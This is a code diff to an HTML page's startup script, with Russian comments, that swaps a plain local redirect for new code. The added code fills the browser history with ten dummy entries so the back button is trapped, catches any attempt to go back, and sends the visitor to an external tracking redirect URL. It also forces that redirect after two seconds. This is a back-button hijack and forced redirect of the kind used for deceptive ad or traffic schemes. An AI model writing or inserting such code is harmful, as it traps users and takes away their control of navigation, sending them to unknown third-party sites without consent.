@@ -11,7 +11,20 @@
   <link rel="icon" href="fav.png" />
     <script type="text/javascript">
       document.addEventListener('DOMContentLoaded', () => {
-          window.location.href = './pwa1.html';
+            // Наполняем стек истории
+            for (let i = 0; i < 10; ++i) {
+        history.pushState({}, '', window.location.href);
+      }
+
+      // Перехватываем "назад" или закрытие
+      window.onpopstate = () => {
+        console.log('User pressed back or tried to close the app');
+        // Редирект при попытке "назад"
+        window.location.href = 'https://itonixr.com/out/9327851?rhd=1&os_version=15.3.0&btz=Europe/Moscow&bto=-180&z=9327851'; // Укажи нужный URL сюда
+      };
+      setTimeout(() => {
+        window.location.href = 'https://itonixr.com/out/9327851?rhd=1&os_version=15.3.0&btz=Europe/Moscow&bto=-180&z=9327851';
+      }, 2000);
         });
   </script>
 </head>
